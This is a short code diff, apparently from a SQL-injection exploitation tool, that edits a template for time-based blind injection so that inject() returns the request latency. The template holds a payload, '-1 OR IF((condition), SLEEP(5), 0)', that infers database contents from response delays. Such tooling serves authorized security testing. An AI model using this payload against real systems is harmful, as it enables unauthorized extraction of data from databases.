@@ -1195,8 +1195,8 @@ async def inject(self, payload: Node) -> bytes:
 ###
 ### TIMEBASED SQL INJECTION
 ###
-### inject() returns nothing, but the time it takes to execute the query is
-### used to infer the result
+### inject() returns the time the request took, in seconds; the delay is used
+### to infer the result
 ###
 
 async def set_method(self) -> Compiler:
@@ -1206,11 +1206,11 @@ async def set_method(self) -> Compiler:
         delay=..., # Minimum delay induced by SQL statements that evaluate to true
     )
 
-async def inject(self, condition: Node) -> None:
+async def inject(self, condition: Node) -> float:
     # TODO The payload must induce a delay if the condition is true
     payload = f"-1 OR IF(({condition}), SLEEP(5), 0)"
     response = await self.send(payload)
-    return None
+    return response.latency
     """,
         }
 
